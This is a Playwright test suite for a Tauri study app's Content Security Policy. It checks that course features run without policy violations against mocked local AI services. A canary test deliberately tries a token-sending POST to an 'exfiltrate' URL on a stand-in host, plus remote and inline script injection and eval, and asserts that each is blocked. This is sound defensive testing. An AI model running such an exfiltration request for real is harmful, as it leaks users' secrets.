import { expect, test, type Page, type Route } from '@playwright/test';
import { readdir, readFile } from 'node:fs/promises';
import { parseCsp, productionCspHeader, type TauriSecurityConfig } from '../../src/test/tauri-csp';
import { createFixtureWorkspace } from '../../src/test/workspace-fixture';

// These tests run against the production build served with the exact Content Security Policy from
// src-tauri/tauri.conf.json (see the "csp" project and the second web server in playwright.config.ts).
// A feature that needs something the policy does not allow shows up here as a violation, not as a silent failure.

const LM_STUDIO = 'http://127.0.0.1:1234/v1';
const CORS = { 'access-control-allow-origin': '*', 'access-control-allow-headers': '*' };

interface Violation {
  directive: string;
  blocked: string;
  source: string;
}

// Collects both the DOM event (documents) and the console report (workers, which have their own global scope).
async function watchViolations(page: Page) {
  const consoleReports: string[] = [];
  page.on('console', (message) => {
    if (/Content Security Policy|violates the following/i.test(message.text())) consoleReports.push(message.text());
  });
  page.on('pageerror', (error) => {
    if (/Content Security Policy/i.test(error.message)) consoleReports.push(error.message);
  });
  await page.addInitScript(() => {
    const store: Violation[] = [];
    (window as unknown as { __cspViolations: Violation[] }).__cspViolations = store;
    document.addEventListener('securitypolicyviolation', (event) => {
      store.push({ directive: event.violatedDirective, blocked: event.blockedURI, source: event.sourceFile });
    }, true);
  });
  return async () => {
    const violations = await page.evaluate(() => (window as unknown as { __cspViolations: Violation[] }).__cspViolations);
    return { violations, consoleReports };
  };
}

async function expectNoViolations(read: Awaited<ReturnType<typeof watchViolations>>) {
  const { violations, consoleReports } = await read();
  expect(violations, 'securitypolicyviolation events').toEqual([]);
  expect(consoleReports, 'console reports about the Content Security Policy').toEqual([]);
}

const json = (route: Route, body: unknown) => route.fulfill({ json: body, headers: CORS });

// Loopback services answer through the real origins the packaged app uses, so connect-src is exercised by every call.
async function mockLoopbackServices(page: Page, options: { llm: 'online' | 'offline' } = { llm: 'online' }) {
  await page.route('http://127.0.0.1:8765/**', (route) => route.request().method() === 'OPTIONS'
    ? route.fulfill({ status: 204, headers: CORS })
    : json(route, { status: 'ready', model: 'fixture-asr' }));
  await page.route('http://127.0.0.1:8766/**', (route) => {
    const { pathname } = new URL(route.request().url());
    if (route.request().method() === 'OPTIONS') return route.fulfill({ status: 204, headers: CORS });
    if (pathname.endsWith('/health')) return json(route, { status: 'ready', model: 'fixture-documents' });
    return route.fulfill({ status: 503, json: { error: 'The document fixture does not extract.' }, headers: CORS });
  });
  await page.route(`${LM_STUDIO}/**`, (route) => {
    const request = route.request();
    if (request.method() === 'OPTIONS') return route.fulfill({ status: 204, headers: CORS });
    if (options.llm === 'offline') return route.abort('connectionrefused');
    if (request.url().endsWith('/models')) return json(route, { data: [{ id: 'fixture-model' }] });
    return json(route, { model: 'fixture-model', choices: [{ message: { content: 'Scaling keeps softmax sensitive: $\\frac{QK^T}{\\sqrt{d_k}}$.' } }] });
  });
}

function textPdf() {
  const content = 'BT /F1 28 Tf 20 90 Td (Hello CSP) Tj ET';
  const objects = [
    '1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n',
    '2 0 obj\n<< /Type /Pages /Count 1 /Kids [3 0 R] >>\nendobj\n',
    '3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 240 180] /Resources << /Font << /F1 5 0 R >> >> /Contents 4 0 R >>\nendobj\n',
    `4 0 obj\n<< /Length ${content.length} >>\nstream\n${content}\nendstream\nendobj\n`,
    '5 0 obj\n<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>\nendobj\n',
  ];
  let pdf = '%PDF-1.4\n';
  const offsets = [0];
  for (const object of objects) {
    offsets.push(pdf.length);
    pdf += object;
  }
  const xrefOffset = pdf.length;
  pdf += `xref\n0 ${objects.length + 1}\n0000000000 65535 f \n`;
  pdf += offsets.slice(1).map((offset) => `${String(offset).padStart(10, '0')} 00000 n \n`).join('');
  pdf += `trailer\n<< /Size ${objects.length + 1} /Root 1 0 R >>\nstartxref\n${xrefOffset}\n%%EOF`;
  return Buffer.from(pdf);
}

function silentWav() {
  const samples = 800;
  const buffer = Buffer.alloc(44 + samples * 2);
  buffer.write('RIFF', 0); buffer.writeUInt32LE(36 + samples * 2, 4); buffer.write('WAVEfmt ', 8);
  buffer.writeUInt32LE(16, 16); buffer.writeUInt16LE(1, 20); buffer.writeUInt16LE(1, 22);
  buffer.writeUInt32LE(8000, 24); buffer.writeUInt32LE(16000, 28); buffer.writeUInt16LE(2, 32); buffer.writeUInt16LE(16, 34);
  buffer.write('data', 36); buffer.writeUInt32LE(samples * 2, 40);
  return buffer;
}

const openSources = (page: Page) => page.getByRole('tab', { name: /^Sources/ }).click();

test.describe('production Content Security Policy', () => {
  test('is the policy served with the page and blocks eval, remote scripts and remote requests', async ({ page, request, baseURL }) => {
    const config = JSON.parse(await readFile('src-tauri/tauri.conf.json', 'utf8')) as TauriSecurityConfig;
    const response = await request.get(baseURL!);
    expect(response.headers()['content-security-policy']).toBe(productionCspHeader(config));

    // Canary: prove the header is enforced, so the "no violations" assertions below mean something.
    await mockLoopbackServices(page);
    await page.goto('/');
    const outcome = await page.evaluate(async () => {
      const seen: string[] = [];
      document.addEventListener('securitypolicyviolation', (event) => seen.push(event.violatedDirective));
      // Run later, outside the CDP call: Playwright's own evaluation is exempt from the eval restriction.
      const evalAllowed = await new Promise<boolean>((resolve) => setTimeout(() => {
        try { new Function('return 1')(); resolve(true); } catch { resolve(false); }
      }, 0));
      const remoteFetch = await fetch('https://example.com/exfiltrate', { method: 'POST', body: 'token' }).then(() => 'sent', () => 'blocked');
      const lanFetch = await fetch('http://192.168.1.10:1234/v1/models').then(() => 'sent', () => 'blocked');
      const script = document.createElement('script');
      script.src = 'https://example.com/remote.js';
      document.head.append(script);
      const inline = document.createElement('script');
      inline.textContent = 'window.__inlineRan = true';
      document.head.append(inline);
      const image = new Image();
      image.src = 'https://example.com/pixel.png';
      await new Promise((resolve) => setTimeout(resolve, 300));
      return { evalAllowed, remoteFetch, lanFetch, inlineRan: (window as unknown as { __inlineRan?: boolean }).__inlineRan === true, seen };
    });
    expect(outcome).toMatchObject({ evalAllowed: false, remoteFetch: 'blocked', lanFetch: 'blocked', inlineRan: false });
    expect(outcome.seen).toEqual(expect.arrayContaining(['script-src-elem', 'connect-src', 'img-src']));
  });

  test('keeps the seeded course workspace working: settings, search, chat with math, study', async ({ page }) => {
    await page.addInitScript((workspace) => {
      localStorage.setItem('studentllm.workspace.v1', JSON.stringify(workspace));
      localStorage.setItem('studentllm.recording-notice.v1', JSON.stringify({ version: 1, acknowledgedAt: new Date().toISOString() }));
    }, createFixtureWorkspace());
    const read = await watchViolations(page);
    await mockLoopbackServices(page);
    await page.goto('/');
    await expect(page.getByRole('heading', { name: 'Attention & Scaled Dot-Product' }).first()).toBeVisible();

    await page.getByRole('button', { name: 'Settings', exact: true }).click();
    const settings = page.getByRole('dialog', { name: 'Settings', exact: true });
    await expect(settings.getByRole('status')).toContainText('Connected');
    await expect(settings).toContainText('fixture-asr');
    await expect(settings).toContainText('fixture-documents');
    await settings.getByRole('button', { name: 'Refresh local services' }).click();
    await expect(settings).toContainText('fixture-documents');
    await settings.getByRole('button', { name: 'Done' }).click();

    await page.getByRole('button', { name: /Global search/ }).click();
    await page.getByRole('textbox', { name: 'Search all course content' }).fill('square-root factor');
    await expect(page.getByRole('button', { name: /square-root factor/ })).toContainText('Attention & Scaled Dot-Product');
    await page.getByRole('button', { name: /square-root factor/ }).click();

    await page.getByRole('tab', { name: 'Chat' }).click();
    await page.getByRole('textbox', { name: 'Ask the course chat' }).fill('Why does the square-root factor keep the logits in range?');
    await page.getByRole('button', { name: 'Send' }).click();
    await expect(page.locator('.katex').first()).toBeVisible({ timeout: 15_000 });
    await expect(page.locator('.katex annotation').first()).toContainText('\\frac{QK^T}{\\sqrt{d_k}}');

    await page.getByRole('tab', { name: 'Study' }).click();
    await page.getByRole('button', { name: /Targeted quiz/ }).click();
    await expect(page.getByRole('heading', { name: 'Saved materials' })).toBeVisible();

    await expectNoViolations(read);
  });

  test('explains that the local model is offline and keeps the question', async ({ page }) => {
    await page.addInitScript((workspace) => {
      localStorage.setItem('studentllm.workspace.v1', JSON.stringify(workspace));
    }, createFixtureWorkspace());
    const read = await watchViolations(page);
    await mockLoopbackServices(page, { llm: 'offline' });
    await page.goto('/');

    await page.getByRole('tab', { name: 'Chat' }).click();
    await page.getByRole('textbox', { name: 'Ask the course chat' }).fill('Explain the role of normalization.');
    await page.getByRole('button', { name: 'Send' }).click();
    // A refused connection is not an answer: it is explained, not saved, and the question goes back to the composer.
    await expect(page.getByRole('alert')).toContainText('The AI model is not reachable', { timeout: 15_000 });
    await expect(page.getByRole('textbox', { name: 'Ask the course chat' })).toHaveValue('Explain the role of normalization.');
    await expect(page.getByRole('article', { name: 'Course assistant response' })).toHaveCount(0);

    await expectNoViolations(read);
  });

  test('loads the audio capture worklet from the bundle', async ({ page }) => {
    const assets = await readdir('dist-csp/assets');
    const worklet = assets.find((name) => /^pcm-capture\.worklet.*\.js$/.test(name));
    expect(worklet, 'the worklet is emitted as a separate same-origin file').toBeDefined();
    const read = await watchViolations(page);
    await mockLoopbackServices(page);
    await page.goto('/');
    const loaded = await page.evaluate(async (url) => {
      if (typeof AudioContext === 'undefined' || typeof AudioWorkletNode === 'undefined') return 'unsupported';
      const context = new AudioContext({ sampleRate: 48000 });
      try {
        await context.audioWorklet.addModule(url);
        new AudioWorkletNode(context, 'studentllm-pcm-capture');
        return 'loaded';
      } finally {
        await context.close();
      }
    }, `/assets/${worklet}`);
    test.skip(loaded === 'unsupported', 'This browser has no AudioWorklet.');
    expect(loaded).toBe('loaded');
    await expectNoViolations(read);
  });

  test('creates a course, imports text with a formula, and previews PDF, image, audio and document sources', async ({ page }) => {
    test.setTimeout(90_000);
    await page.addInitScript(() => {
      localStorage.setItem('studentllm.recording-notice.v1', JSON.stringify({ version: 1, acknowledgedAt: new Date().toISOString() }));
    });
    const read = await watchViolations(page);
    await mockLoopbackServices(page, { llm: 'offline' });
    await page.goto('/');

    await page.getByRole('button', { name: 'Create your first course' }).click();
    await page.getByLabel('Course title').fill('Probability notes');
    await page.getByRole('button', { name: 'Create course', exact: true }).click();
    const chooserPromise = page.waitForEvent('filechooser');
    await page.getByRole('button', { name: 'Import file', exact: true }).click();
    await (await chooserPromise).setFiles({
      name: 'probability.md',
      mimeType: 'text/markdown',
      buffer: Buffer.from('Independent event probabilities multiply: $P(A \\cap B) = P(A)P(B)$.\n\n$$\\int_0^1 x^2\\,dx = \\frac{1}{3}$$'),
    });
    const note = page.getByRole('region', { name: 'Course notes document' });
    await expect(note).toContainText('Independent event probabilities multiply');
    await expect(note.locator('.katex').first()).toBeVisible();
    await expect(note.locator('.katex-display, .katex').nth(1)).toBeVisible();
    // KaTeX glyphs come from the bundled font files; a blocked font would leave the document without them.
    await expect.poll(() => page.evaluate(async () => {
      await document.fonts.ready;
      return [...document.fonts].filter((font) => font.family.startsWith('KaTeX') && font.status === 'loaded').length;
    })).toBeGreaterThan(0);

    for (const file of [
      { name: 'slides.pdf', mimeType: 'application/pdf', buffer: textPdf() },
      { name: 'figure.png', mimeType: 'image/png', buffer: Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII=', 'base64') },
      { name: 'lecture.wav', mimeType: 'audio/wav', buffer: silentWav() },
      { name: 'handout.rtf', mimeType: 'application/rtf', buffer: Buffer.from('{\\rtf1\\ansi Handout}') },
    ]) {
      await page.setInputFiles('input[aria-label="Select course source"]', file);
      await openSources(page);
      await expect(page.getByRole('button', { name: new RegExp(`^${file.name.replace('.', '\\.')}`) })).toBeVisible({ timeout: 20_000 });
    }

    await openSources(page);
    await page.getByRole('button', { name: /^Show \d+ more sources$/ }).click();
    await page.getByRole('button', { name: /^slides\.pdf/ }).click();
    const pdf = page.getByRole('dialog', { name: 'slides.pdf' });
    const canvas = pdf.locator('canvas[aria-label="PDF page 1"]');
    await expect(canvas).toBeVisible({ timeout: 20_000 });
    // The page has text in a standard font, so glyphs must actually be painted, not just an empty canvas.
    await expect.poll(() => canvas.evaluate((element) => {
      const target = element as HTMLCanvasElement;
      const { data } = target.getContext('2d')!.getImageData(0, 0, target.width, target.height);
      let painted = 0;
      for (let index = 3; index < data.length; index += 4) if (data[index] !== 0) painted += 1;
      return painted;
    })).toBeGreaterThan(50);
    await page.getByRole('button', { name: 'Close source preview' }).click();

    await page.getByRole('button', { name: /^figure\.png/ }).click();
    const image = page.getByRole('dialog', { name: 'figure.png' }).locator('img[alt="Preview of figure.png"]');
    await expect(image).toBeVisible();
    expect(await image.evaluate((element) => (element as HTMLImageElement).complete && (element as HTMLImageElement).naturalWidth)).toBe(1);
    await page.getByRole('button', { name: 'Close source preview' }).click();

    await page.getByRole('button', { name: /^lecture\.wav/ }).click();
    const audio = page.getByRole('dialog', { name: 'lecture.wav' }).locator('audio');
    await expect(audio).toBeVisible();
    await expect.poll(() => audio.evaluate((element) => (element as HTMLAudioElement).readyState)).toBeGreaterThan(0);
    await page.getByRole('button', { name: 'Close source preview' }).click();

    await page.getByRole('button', { name: /^handout\.rtf/ }).click();
    await expect(page.getByRole('dialog', { name: 'handout.rtf' }).locator('iframe')).toHaveAttribute('src', /^blob:/);
    await page.getByRole('button', { name: 'Close source preview' }).click();

    await page.reload();
    await expect(page.getByRole('heading', { name: 'Probability notes', level: 1 })).toBeVisible();
    await expectNoViolations(read);
  });
});
